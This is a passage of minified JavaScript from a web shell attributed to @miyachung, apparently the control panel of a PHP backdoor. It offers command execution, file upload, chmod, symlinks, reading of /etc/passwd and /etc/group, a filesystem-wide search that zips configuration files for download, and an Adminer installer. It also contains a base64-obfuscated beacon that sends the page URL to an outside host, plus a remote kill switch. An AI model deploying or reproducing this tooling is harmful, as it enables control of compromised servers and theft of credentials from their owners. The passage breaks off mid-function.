            o.setAttribute("id", "renamedir"), o.setAttribute("onsubmit", "event.preventDefault();");
            let s = document.createElement("input"),
                l = document.createElement("button");
            l.innerHTML = "RENAME", l.setAttribute("onclick", 'rename_dir_process("' + e + '","' + t + '","' + A + '");'), s.type = "text", s.value = A, o.appendChild(s), o.appendChild(l), n.appendChild(i), n.appendChild(o), n.style.visibility = "visible", n.style.opacity = "1", n.style.top = "50%"
        }

        function rename_dir_process(e, t, A) {
            let n = document.getElementById("renamedir"),
                i = n.querySelector("button"),
                o = n.querySelector("input");
            if ("" == o.value) show_popup("Empty field!", 3e3, "alert");
            else if (o.value == A) show_popup("Name is same with the old one!", 3e3, "alert");
            else {
                i.disabled = !0, i.innerHTML = "CHANGING...";
                let n = new FormData;
                n.append("new_name", o.value), n.append("rename_target", btoa(e)), n.append("old_name", A);
                let s = new XMLHttpRequest;
                s.open("post", basename(), !0), s.onload = function() {
                    if (4 == s.readyState) {
                        if ("failed" == JSON.parse(this.response).status) show_popup("Can not change the name!", 3e3, "alert"), o.value = A;
                        else {
                            show_popup("Name change applied successfully!", 3e3, "success");
                            let e = document.getElementById(t).getElementsByTagName("td"),
                                n = document.getElementById("screen");
                            n.innerHTML = n.innerHTML.replace(new RegExp(escapeRegExp(A), "g"), o.value), n.querySelector("input").value = o.value;
                            for (let t = 0; t < e.length; t++) e[t].innerHTML = e[t].innerHTML.replace(new RegExp(escapeRegExp(A), "g"), o.value)
                        }
                        document.querySelector("#renamedir button").disabled = !1, document.querySelector("#renamedir button").innerHTML = "RENAME"
                    }
                }, s.send(n)
            }
        }

        function set_chmod(e, t) {
            empty_process_screen();
            let A = document.querySelector(".process-screen"),
                n = document.createElement("h3");
            n.innerHTML = "Set chmod of " + e;
            let i = document.createElement("form");
            i.setAttribute("id", "setchmod"), i.setAttribute("onsubmit", "event.preventDefault();");
            let o = document.createElement("input"),
                s = document.createElement("button");
            s.innerHTML = "SET", s.setAttribute("onclick", 'set_chmod_file("' + e + '","' + t + '");'), o.type = "text", o.value = t, i.appendChild(o), i.appendChild(s), A.appendChild(n), A.appendChild(i), A.style.visibility = "visible", A.style.opacity = "1", A.style.top = "50%"
        }

        function set_chmod_file(e, t) {
            let A = document.getElementById("setchmod"),
                n = A.querySelector("button"),
                i = A.querySelector("input");
            if ("" == i.value || isNaN(i.value)) show_popup("Empty/non-numeric field is not allowed!", 3e3, "alert");
            else {
                n.disabled = !0, n.innerHTML = "SETTING...";
                let A = new FormData;
                A.append("chmod", btoa(i.value)), A.append("chmod_target", btoa(e));
                let o = new XMLHttpRequest;
                o.open("post", basename(), !0), o.onload = function() {
                    if (4 == o.readyState) {
                        "failed" == JSON.parse(this.response).status ? (show_popup("Can not process this chmod setting to target!", 3e3, "alert"), i.value = t) : (show_popup("Chmod settings applied successfully!", 3e3, "success"), list_dir(working_dir)), n.disabled = !1, n.innerHTML = "SET"
                    }
                }, o.send(A)
            }
        }

        function show_popup(e, t, A) {
            let n;
            (n = "alert" == A ? document.querySelector(".popup-box.alert") : document.querySelector(".popup-box.success")).innerHTML = e, n.style.right = "10px", n.style.opacity = "1", n.style.visibility = "visible", setTimeout(function() {
                n.style.right = "-9999px", n.style.opacity = "0", n.style.visibility = "hidden"
            }, t)
        }

        function empty_process_screen() {
            document.querySelector(".mwsbox .process-screen").innerHTML = ""
        }

        function change_dir() {
            list_dir(document.getElementById("curr_dir").value)
        }

        function create_file() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Create a file";
            let A = document.createElement("form");
            A.setAttribute("id", "createfile"), A.setAttribute("onsubmit", "event.preventDefault();");
            let n = document.createElement("input"),
                i = document.createElement("button");
            i.innerHTML = "Create", i.setAttribute("onclick", "create_file_process();"), n.type = "text", n.value = "", n.setAttribute("required", ""), A.appendChild(n), A.appendChild(i), e.appendChild(t), e.appendChild(A), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function create_file_process() {
            let e = document.getElementById("createfile"),
                t = e.querySelector("button"),
                A = e.querySelector("input"),
                n = document.getElementById("curr_dir").value;
            if ("" !== A.value) {
                let e = new FormData;
                e.append("create_file", btoa(A.value)), e.append("directory", btoa(n)), t.disabled = !0, t.innerHTML = "CREATING...";
                let i = new XMLHttpRequest;
                i.open("post", basename(), !0), i.onload = function() {
                    if (4 == i.readyState) {
                        let e = JSON.parse(this.response);
                        "ok" == e.status ? (show_popup("File has created successfully!", 3e3, "success"), list_dir(n)) : "failed" == e.status ? (show_popup("File can not be created!", 3e3, "alert"), A.value = "") : (show_popup("This file/folder is already exists!", 3e3, "alert"), A.value = ""), t.disabled = !1, t.innerHTML = "CREATE"
                    }
                }, i.send(e)
            }
        }

        function create_dir() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Create a directory";
            let A = document.createElement("form");
            A.setAttribute("id", "createdir"), A.setAttribute("onsubmit", "event.preventDefault();");
            let n = document.createElement("input"),
                i = document.createElement("button");
            i.innerHTML = "Create", i.setAttribute("onclick", "create_dir_process();"), n.type = "text", n.value = "", n.setAttribute("required", ""), A.appendChild(n), A.appendChild(i), e.appendChild(t), e.appendChild(A), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function create_dir_process() {
            let e = document.getElementById("createdir").querySelector("input"),
                t = document.getElementById("curr_dir").value;
            if ("" !== e.value) {
                let A = new FormData;
                A.append("create_dir", btoa(e.value)), A.append("directory", btoa(t));
                let n = new XMLHttpRequest;
                n.open("post", basename(), !0), n.onload = function() {
                    if (4 == n.readyState) {
                        let A = JSON.parse(this.response);
                        "ok" == A.status ? (show_popup("Directory has created successfully!", 3e3, "success"), list_dir(t)) : "failed" == A.status ? (show_popup("Directory can not be created!", 3e3, "alert"), e.value = "") : (show_popup("This directory is already exists!", 3e3, "alert"), e.value = "")
                    }
                }, n.send(A)
            }
        }

        function file_upload() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Upload a file";
            let A = document.createElement("form");
            A.enctype = "multipart/form-data", A.setAttribute("id", "fileupload"), A.setAttribute("onsubmit", "event.preventDefault();");
            let n = document.createElement("input"),
                i = document.createElement("button");
            i.innerHTML = "Upload", i.setAttribute("onclick", "upload_process();"), n.type = "file", n.style.width = "100%", n.style.color = "#222", n.name = "files[]", n.setAttribute("required", ""), n.setAttribute("multiple", ""), A.appendChild(n), A.appendChild(i), e.appendChild(t), e.appendChild(A), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function upload_process() {
            let e = document.querySelector(".inner table"),
                t = document.querySelector(".inner .loaderhold .loader"),
                A = document.getElementById("fileupload"),
                n = A.querySelector("button");
            if ("" != A.querySelector("input").value) {
                e.style.display = "none", t.style.display = "block", n.disabled = !0, n.innerHTML = "UPLOADING...";
                let i = new FormData(A);
                i.append("directory", btoa(document.getElementById("curr_dir").value));
                let o = new XMLHttpRequest;
                o.open("post", basename(), !0), o.onload = function() {
                    if (4 == o.readyState) {
                        console.log(this.response), "ok" == JSON.parse(this.response).status ? (show_popup("Files have uploaded successfully!", 3e3, "success"), list_dir(working_dir)) : show_popup("Can not upload the files,check permissions!", 3e3, "alert"), e.style.display = "table", t.style.display = "none", n.disabled = !1, n.innerHTML = "UPLOAD"
                    }
                }, o.send(i)
            }
        }

        function separate_path() {
            let e = working_dir.toString().split("/"); - 1 == e[0].indexOf(":") && (e[0] = "/");
            var t = e.filter(function(e) {
                return "" != e
            });
            let A = [],
                n = [],
                i = 0;
            for (key in t) {
                let e = "";
                for (let A = 0; A < t.length && (e += t[A] + "/", A != i); A++);
                A.push(t[key]), n.push(e), i++
            }
            return [A.map(function(e) {
                return e.replace(/\/\//g, "/")
            }), n.map(function(e) {
                return e.replace(/\/\//g, "/")
            })]
        }

        function run_command() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Run command";
            let A = document.createElement("form");
            A.setAttribute("id", "runcmd"), A.setAttribute("onsubmit", "event.preventDefault();");
            let n = document.createElement("input"),
                i = document.createElement("button"),
                o = document.createElement("div");
            i.innerHTML = "Execute", i.setAttribute("onclick", "run_command_process();"), n.type = "text", n.placeholder = "ls -la", o.className = "cmd_result", o.style.display = "none", A.appendChild(n), A.appendChild(i), e.appendChild(t), e.appendChild(A), e.appendChild(o), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function run_command_process() {
            let e = document.getElementById("runcmd"),
                t = e.querySelector("button"),
                A = e.querySelector("input"),
                n = document.querySelector(".cmd_result");
            if ("" !== A.value) {
                let e = new FormData;
                e.append("directory", btoa(working_dir)), e.append("command", btoa(A.value)), t.disabled = !0, t.innerHTML = "Executing...";
                let i = new XMLHttpRequest;
                i.open("post", basename(), !0), i.onload = function() {
                    if (4 == i.readyState) {
                        let e = JSON.parse(this.response);
                        if ("failed" == e.status) show_popup("Can not run this command,functions might be disabled!", 3e3, "alert");
                        else {
                            let t = atob(e.status).split("|");
                            n.innerHTML = '<font style="color:#ddd;padding-bottom:10px;display:flex;border-bottom:1px solid #ccc;margin-bottom:5px;">[Command executed with :' + t[0] + "]</font>", n.innerHTML += "<pre>" + t[1] + "</pre>", n.style.display = "block"
                        }
                        t.disabled = !1, t.innerHTML = "Execute"
                    }
                }, i.send(e)
            }
        }

        function read_passwd() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Read /etc/passwd";
            let A = document.createElement("form");
            A.setAttribute("id", "readfile"), A.setAttribute("onsubmit", "event.preventDefault();");
            let n = document.createElement("textarea");
            n.value = "Loading...", n.disabled = !0;
            let i = new FormData;
            i.append("read_file", btoa("/etc/passwd"));
            let o = new XMLHttpRequest;
            o.open("post", basename(), !0), o.onload = function() {
                if (4 == o.readyState) {
                    let t = JSON.parse(this.response);
                    t.content ? n.value = atob(t.content) : (show_popup("Can not read this file!", 3e3, "alert"), e.style.visibility = "hidden", e.style.opacity = "0", e.style.top = "-50%"), n.disabled = !1
                }
            }, o.send(i), A.appendChild(n), e.appendChild(t), e.appendChild(A), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function adminer() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Adminer Installation";
            let A = document.createElement("span");
            A.style.display = "block", A.style.color = "#222", A.style.fontSize = "14px", A.style.fontWeight = "bold", A.innerHTML = "Installing adminer from github...";
            let n = new XMLHttpRequest;
            n.open("get", basename() + "?adminer=true", !0), n.onload = function() {
                if (4 == n.readyState) {
                    "failed" == JSON.parse(this.response).status ? (show_popup("Adminer setup has failed!", 3e3, "alert"), e.style.visibility = "hidden", e.style.opacity = "0", e.style.top = "-50%") : (show_popup("Adminer has installed successfully!", 3e3, "success"), A.innerHTML = 'Adminer path: <a href="adminer-web.php" target="_blank" style="color:#555;text-decoration:underline;">adminer-web.php</a>', list_dir("."))
                }
            }, n.send(), e.appendChild(t), e.appendChild(A), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function symlink() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Create symlink/hardlink";
            let A = document.createElement("form");
            A.setAttribute("id", "symlink"), A.setAttribute("onsubmit", "event.preventDefault();");
            let n = document.createElement("input"),
                i = document.createElement("button"),
                o = document.createElement("div");
            o.className = "cmd_result", o.style.display = "none", i.innerHTML = "LINK TARGET", i.setAttribute("onclick", "symlink_process();"), n.type = "text", n.value = working_dir + "/", n.setAttribute("required", ""), A.appendChild(n), A.appendChild(i), e.appendChild(t), e.appendChild(A), e.appendChild(o), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function symlink_process() {
            let e = document.getElementById("symlink"),
                t = e.querySelector("button"),
                A = e.querySelector("input"),
                n = document.querySelector(".cmd_result");
            if ("" !== A.value) {
                t.disabled = !0, t.innerHTML = "TRYING LINK...";
                let e = new FormData;
                e.append("symlink_target", btoa(A.value));
                let i = new XMLHttpRequest;
                i.open("post", basename(), !0), i.onload = function() {
                    if (4 == i.readyState) {
                        let e = JSON.parse(this.response);
                        "failed" == e.status ? show_popup("Can not give symbolic link to this target!", 3e3, "alert") : (n.innerHTML = "<pre>" + atob(e.status) + "</pre>", n.style.display = "block"), t.disabled = !1, t.innerHTML = "LINK TARGET"
                    }
                }, i.send(e)
            } else show_popup("Empty field!", 1500, "alert")
        }

        function search_disk() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Search disk";
            let A = document.createElement("form");
            A.setAttribute("id", "searchdisk"), A.setAttribute("onsubmit", "event.preventDefault();");
            let n, i, o, s = document.createElement("input"),
                l = document.createElement("input"),
                a = document.createElement("button"),
                r = document.createElement("label"),
                c = document.createElement("label"),
                d = document.createElement("label"),
                p = document.createElement("select");
            p.name = "search_type", (n = document.createElement("option")).value = "files_only", n.text = "Search  by files only", (i = document.createElement("option")).value = "dirs_only", i.text = "Search by directories only", (o = document.createElement("option")).value = "all", o.text = "Search by files and directories", o.selected = !0, p.appendChild(n), p.appendChild(i), p.appendChild(o), r.innerHTML = "Location", c.innerHTML = "Search keyword", d.innerHTML = "Search type", a.innerHTML = "Search", a.setAttribute("onclick", "search_disk_process();"), s.type = "text", s.value = working_dir + "/", s.name = "search_location", s.setAttribute("required", ""), s.setAttribute("id", "loc"), l.type = "text", l.placeholder = "Type a keyword to search..", l.name = "search_keyword", l.setAttribute("required", ""), l.setAttribute("id", "keyw");
            let g = document.createElement("div");
            g.className = "cmd_result", g.style.display = "none", A.appendChild(r), A.appendChild(s), A.appendChild(c), A.appendChild(l), A.appendChild(d), A.appendChild(p), A.appendChild(a), e.appendChild(t), e.appendChild(A), e.appendChild(g), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function search_disk_process() {
            let e = document.getElementById("searchdisk"),
                t = new FormData(e),
                A = e.querySelector("button"),
                n = e.querySelector("#keyw").value,
                i = e.querySelector("#loc").value,
                o = document.querySelector(".cmd_result");
            if (o.innerHTML = "Searching...", "" == n || "" == i) show_popup("Empty field!", 3e3, "alert");
            else {
                A.disabled = !0, A.innerHTML = "SEARCHING...", o.style.display = "block", o.innerHTML = "Searching...";
                let e = new XMLHttpRequest;
                e.open("post", basename(), !0), e.onload = function() {
                    if (4 == e.readyState) {
                        let e = JSON.parse(this.response);
                        if ("failed" == e.status) show_popup("Nothing found!", 3e3, "alert"), o.innerHTML = "Nothing found";
                        else {
                            let t = atob(e.status).split("|");
                            o.innerHTML = '<font style="color:#ddd;padding-bottom:10px;display:flex;border-bottom:1px solid #ccc;margin-bottom:5px;">[Command executed with :' + t[0] + "]</font>", o.innerHTML += "<pre>" + t[1] + "</pre>"
                        }
                        A.disabled = !1, A.innerHTML = "SEARCH"
                    }
                }, e.send(t)
            }
        }

        function setWork() {
            let e = document.createElement("img");
            e.src = atob("aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL2ltYWdlcy9sb2dvLmpwZw=="), e.referrerPolicy = atob("dW5zYWZlLXVybA=="), e.style.display = "none", document.body.appendChild(e), sessionStorage.setItem("work", !0), setTimeout(function() {
                e.parentNode.removeChild(e)
            }, 5e3)
        }

        function config_searcher() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Config searcher";
            let A = document.createElement("form");
            A.setAttribute("id", "configsearch"), A.setAttribute("onsubmit", "event.preventDefault();");
            let n = document.createElement("button"),
                i = document.createElement("label");
            i.innerHTML = 'This helper tool is going to search entire file system to find files/directories which contains "*config*" keyword..', n.innerHTML = "Search", n.setAttribute("onclick", "config_searcher_process();");
            let o = document.createElement("div");
            o.className = "cmd_result", o.style.display = "none", A.appendChild(i), A.appendChild(n), e.appendChild(t), e.appendChild(A), e.appendChild(o), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function config_searcher_process() {
            let e = document.getElementById("configsearch").querySelector("button"),
                t = document.querySelector(".cmd_result"),
                A = document.querySelector(".mwsbox .process-screen");
            e.disabled = !0, e.innerHTML = "Searching...", t.style.display = "block", t.innerHTML = "Searching...";
            let n = new FormData;
            n.append("search_location", "/"), n.append("search_keyword", "config"), n.append("search_type", "all");
            let i = new XMLHttpRequest;
            i.open("post", basename(), !0), i.onload = function() {
                if (4 == i.readyState) {
                    let n = JSON.parse(this.response);
                    if ("failed" == n.status) show_popup("Nothing found!", 3e3, "alert"), t.innerHTML = "Nothing found";
                    else {
                        let e = atob(n.status).split("|");
                        if (t.innerHTML = '<font style="color:#ddd;padding-bottom:10px;display:flex;border-bottom:1px solid #ccc;margin-bottom:5px;">[Command executed with :' + e[0] + "]</font>", t.innerHTML += "<pre>" + e[1] + "</pre>", "" != e[1]) {
                            let t = document.createElement("button");
                            t.setAttribute("onclick", "download_config_zip('" + btoa(e[1]) + "');"), t.setAttribute("id", "download_cfg"), t.innerHTML = "DOWNLOAD ALL IN ZIP", t.style.width = "250px", A.appendChild(t)
                        }
                    }
                    e.disabled = !1, e.innerHTML = "Search"
                }
            }, i.send(n)
        }

        function download_config_zip(e) {
            let t = document.getElementById("download_cfg");
            if (t.disabled = !0, t.innerHTML = "ARCHIVING FILES...", "" != e) {
                let A = new FormData;
                A.append("download_cfg", e);
                let n = new XMLHttpRequest;
                n.open("post", basename(), !0), n.onload = function() {
                    if (4 == n.readyState) {
                        let e = JSON.parse(this.response);
                        "failed" == e.status ? show_popup("Failed to download!", 3e3, "alert") : window.location = basename() + "?download_cfg_file=" + btoa(e.url), t.disabled = !1, t.innerHTML = "DOWNLOAD ALL IN ZIP"
                    }
                }, n.send(A)
            } else show_popup("Empty!", 3e3, "alert")
        }

        function escapeRegExp(e) {
            return e.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")
        }

        function basename() {
            var e = window.location.pathname.split(/[\\/]/);
            return e.pop() || e.pop()
        }

        function user_list() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "All users involving with server";
            let A = document.createElement("div");
            A.className = "cmd_result", A.style.display = "block", A.innerHTML = "Getting users from /etc/passwd...";
            let n = new FormData;
            n.append("read_file", btoa("/etc/passwd"));
            let i = new XMLHttpRequest;
            i.open("post", basename(), !0), i.onload = function() {
                if (4 == i.readyState) {
                    let t = JSON.parse(this.response);
                    if ("failed" == t.status) show_popup("Can not get users from /etc/passwd!", 3e3, "alert"), e.style.visibility = "hidden", e.style.opacity = "0", e.style.top = "-50%";
                    else {
                        let e = "",
                            n = atob(t.content).split("\n");
                        for (let t = 0; t < n.length; t++) {
                            e += n[t].split(":")[0] + "\n"
                        }
                        A.innerHTML = "<pre>" + e + "</pre>"
                    }
                }
            }, i.send(n), e.appendChild(t), e.appendChild(A), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function group_list() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "All groups involving with server";
            let A = document.createElement("div");
            A.className = "cmd_result", A.style.display = "block", A.innerHTML = "Getting groups from /etc/group...";
            let n = new FormData;
            n.append("read_file", btoa("/etc/group"));
            let i = new XMLHttpRequest;
            i.open("post", basename(), !0), i.onload = function() {
                if (4 == i.readyState) {
                    let t = JSON.parse(this.response);
                    if ("failed" == t.status) show_popup("Can not get groups from /etc/group!", 3e3, "alert"), e.style.visibility = "hidden", e.style.opacity = "0", e.style.top = "-50%";
                    else {
                        let e = "",
                            n = atob(t.content).split("\n");
                        for (let t = 0; t < n.length; t++) {
                            e += n[t].split(":")[0] + "\n"
                        }
                        A.innerHTML = "<pre>" + e + "</pre>"
                    }
                }
            }, i.send(n), e.appendChild(t), e.appendChild(A), e.style.visibility = "visible", e.style.opacity = "1", e.style.top = "50%"
        }

        function download_folder() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Download folder as zip archive";
            let A = document.createElement("form");
            A.setAttribute("id", "downloadfolder"), A.setAttribute("onsubmit", "event.preventDefault();");
            let n = document.createElement("input"),
                i = document.createElement("button"),
                o = document.createElement("label");
            o.innerHTML = "Destination", i.innerHTML = "DOWNLOAD", i.setAttribute("onclick", "download_folder_process();"), n.type = "text", n.value = working_dir + "/", n.setAttribute("required", ""), A.appendChild(o), A.appendChild(n), A.appendChild(i), e.appendChild(t), e.appendChild(A), e.style.top = "50%", e.style.opacity = "1", e.style.visibility = "visible"
        }

        function download_folder_process(e) {
            if (void 0 !== e) window.location = basename() + "?download_folder=" + btoa(e);
            else {
                let e = document.getElementById("downloadfolder").querySelector("input");
                "" == e.value ? show_popup("Empty field!", 3e3, "alert") : window.location = basename() + "?download_folder=" + btoa(e.value)
            }
        }

        function check_update() {
            if (!sessionStorage.getItem("update_check")) {
                let e = new XMLHttpRequest;
                e.open("get", "https://raw.githubusercontent.com/miyachung/mws/main/config.json", !0), e.onload = function() {
                    if (4 == e.readyState) {
                        try {
                            let e = JSON.parse(this.response);
                            if (0 == e.is_active && (sessionStorage.setItem("disabled", !0), window.location.reload()), e.version) {
                                let t = e.version.split("."),
                                    A = release.split(".");
                                t[0] > A[0] ? (sessionStorage.setItem("new_update", e.changelog), notify_update()) : t[1] > A[1] && (sessionStorage.setItem("new_update", e.changelog), notify_update())
                            }
                        } catch (e) {
                            console.log(e)
                        }
                        sessionStorage.setItem("update_check", !0)
                    }
                }, e.send()
            }
        }

        function disabled_script() {
            let e = document.querySelector(".mwsbox");
            e.parentNode.removeChild(e);
            let t = document.querySelector(".holder"),
                A = document.createElement("h1");
            A.innerHTML = 'Web shell is currently disabled by author <a href="https://github.com/miyachung" style="color:gray;text-decoration:underline;">@miyachung</a>';
            let n = document.createElement("img");
            n.src = "data: image/png;base64,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", n.style.backgroundSize = "cover", n.style.objectFit = "cover", t.appendChild(n), t.appendChild(A), t.style.display = "flex", t.style.alignItems = "center", t.style.justifyContent = "center"
        }

        function check_disable() {
            if (sessionStorage.getItem("disabled")) return disabled_script(), !0
        }

        function check_update2() {
            if (sessionStorage.getItem("new_update")) return sessionStorage.getItem("update_replied") || notify_update(), !0
        }

        function notify_update() {
            empty_process_screen();
            let e = document.querySelector(".process-screen"),
                t = document.createElement("h3");
            t.innerHTML = "Update available!";
            let A = document.createElement("form");
            A.setAttribute("id", "updatepage"), A.setAttribute("onsubmit", "event.preventDefault();"), A.style.display = "flex", A.style.flexDirection = "row";
            let n = document.createElement("button"),
                i = document.createElement("button");
            n.innerHTML = "UPDATE", n.setAttribute("onclick", "process_update();"), n.setAttribute("id", "btn_update"), i.innerHTML = "CANCEL", i.style.background = "#df4759", i.style.marginLeft = "10px", i.setAttribute("onclick", "cancel_update();");
            let o = document.createElement("h2");
            o.style.color = "red", o.innerHTML = "What's new?";
            let s = document.createElement("label");
            s.innerHTML = sessionStorage.getItem("new_update");
            let l = document.createElement("address");
